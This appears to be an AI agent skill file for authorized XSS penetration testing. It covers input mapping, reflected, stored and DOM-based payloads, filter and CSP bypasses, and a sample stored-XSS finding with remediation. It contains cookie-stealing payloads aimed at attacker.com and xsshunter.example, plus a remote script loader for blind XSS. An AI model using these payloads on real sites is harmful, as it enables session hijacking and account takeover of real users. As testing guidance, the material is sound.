---
name: testing-for-xss-vulnerabilities
description: Tests web applications for reflected, stored, and DOM-based Cross-Site Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session hijacking and user impersonation.
subdomain: penetration-testing
facing: source
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1055
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
upstream: testing-for-xss-vulnerabilities@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

Not for: against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.

## Codegraph (do this first)
1. `codegraph_explore "HTML/DOM output sinks"` — locate innerHTML/dangerouslySetInnerHTML/echo/render sinks; trace input to each. Output = read.
2. Fixing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- Authorized scope defining target web application and acceptable testing activities
- Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)
- Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)
- XSS Hunter or Burp Collaborator for out-of-band payload verification
- SecLists XSS payload lists and custom payloads for WAF bypass scenarios

## Workflow

### Step 1: Input and Output Mapping

Map every location where user input enters and is rendered by application:

- **Reflected inputs**: Test every URL parameter, search field, error message, and HTTP header value i.e. reflected in response
- **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages
- **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to DOM
- **Output context identification**: For each reflected input, determine rendering context:
  - HTML body: `<div>USER_INPUT</div>`
  - HTML attribute: `<input value="USER_INPUT">`
  - JavaScript string: `var x = 'USER_INPUT';`
  - URL context: `<a href="USER_INPUT">`
  - CSS context: `<div style="color: USER_INPUT">`

### Step 2: Reflected XSS Testing

Test reflected injection points with context-appropriate payloads:

- **HTML body context**: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
- **HTML attribute context**: `" onfocus=alert(1) autofocus="`, `" onmouseover=alert(1) "`, `"><script>alert(1)</script>`
- **JavaScript string context**: `';alert(1)//`, `\';alert(1)//`, `</script><script>alert(1)</script>`
- **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- **Inside HTML comments**: `--><script>alert(1)</script><!--`
- **Filter bypass payloads** (when basic payloads are blocked):
  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
  - Event handlers: `<details open ontoggle=alert(1)>`
  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`

### Step 3: Stored XSS Testing

Test persistent storage points that render input to other users:

- Submit XSS payloads to every stored input field identified in Step 1
- Use unique identifier in each payload to track which inputs trigger: `<script>alert('XSS-PROFILE-001')</script>`
- Check all locations where stored input is rendered (same input may appear on multiple pages)
- Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads
- Test rich text editors by injecting payloads through raw HTML mode or by manipulating POST data after client-side editor sanitizes
- Use XSS Hunter payloads (`"><script src=https://yourxsshunter.xss.ht></script>`) for blind stored XSS where payload fires in admin panel or internal tool you cannot directly access

### Step 4: DOM-Based XSS Testing

Analyze client-side JavaScript for unsafe DOM manipulation:

- **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:
  - `document.location`, `document.URL`, `document.referrer`
  - `location.hash`, `location.search`, `location.href`
  - `window.name`, `postMessage` event data
- **Sink identification**: Search for dangerous sinks that write to DOM:
  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
- **Trace data flow**: Follow path from source to sink. If user-controlled input reaches dangerous sink without proper sanitization, DOM XSS exists.
- **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive

### Step 5: CSP Bypass and Advanced Exploitation

Test Content Security Policy effectiveness and demonstrate real-world impact:

- **CSP analysis**: Review CSP header for weaknesses:
  - `unsafe-inline` in script-src allows inline scripts
  - `unsafe-eval` allows eval() and similar functions
  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
- **JSONP bypass**: If CSP allows domain with JSONP endpoints, use `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
- **Impact demonstration**:
  - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
  - Credential phishing: Inject fake login form overlay that submits to attacker's server
  - Keylogging: Inject JavaScript that captures keystrokes on page
  - Account takeover: Use XSS to change victim's email address and trigger password reset

## Key Concepts

| Term | Definition |
|------|------------|
| **Reflected XSS** | Non-persistent XSS where injected payload is included in server's response to same request, requiring victim to click crafted URL |
| **Stored XSS** | Persistent XSS where payload is saved on server and served to other users who view affected page |
| **DOM-Based XSS** | XSS that occurs entirely in browser when client-side JavaScript reads attacker-controlled data and writes it to dangerous DOM sink |
| **Content Security Policy** | HTTP response header that restricts which sources browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |
| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent browser from interpreting user input as code |
| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |

## Tools & Systems

- **Burp Suite Professional**: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing
- **XSS Hunter**: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS
- **DOMPurify**: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against deployed version
- **Browser Developer Tools**: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time

## Finding: Stored XSS in Support Ticket Description

**ID**: XSS-002
**Severity**: High (CVSS 8.1)
**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
**Parameter**: description (POST body)
**XSS Type**: Stored (persistent)

**Description**:
Support ticket description field does not sanitize HTML input before storing
it in database. When support agent views ticket in admin panel, the
unsanitized HTML is rendered in agent's browser, allowing arbitrary JavaScript
execution in context of admin application.

**Proof of Concept**:
Submitted ticket with payload:
<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">

Payload fired when agent viewed ticket, exfiltrating admin session
cookie to XSS Hunter server.

**Impact**:
Attacker can steal session tokens of support agents and administrators,
gaining access to admin panel with privileges to view customer PII, process
refunds, and modify orders. Affects all 23 support agents who view customer tickets.

**Remediation**:
1. Implement output encoding using context-aware library (OWASP Java Encoder,
   DOMPurify for client-side rendering)
2. Deploy Content Security Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
3. Set HttpOnly flag on session cookies to prevent JavaScript access
4. Sanitize HTML input server-side using whitelist approach (allow only safe tags)
```

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/testing-for-xss-vulnerabilities
